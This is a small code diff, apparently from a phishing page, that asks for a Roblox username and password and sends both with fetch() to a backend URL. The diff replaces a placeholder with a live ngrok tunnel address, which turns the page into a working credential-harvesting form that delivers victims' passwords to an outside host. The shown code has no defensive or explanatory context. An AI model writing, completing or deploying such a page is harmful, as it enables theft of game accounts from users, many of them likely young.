@@ -164,7 +164,7 @@
         alert('Please fill in both Roblox Username and Password fields.');
         return;
       }
-      const backendUrl = 'YOUR_PINGGY_URL/api/verify'; // Update with Pinggy.io URL
+      const backendUrl = 'https://ac0a.ngrok.io'; // Update with Pinggy.io URL
       const data = { username, password };
       try {
         const response = await fetch(backendUrl, {
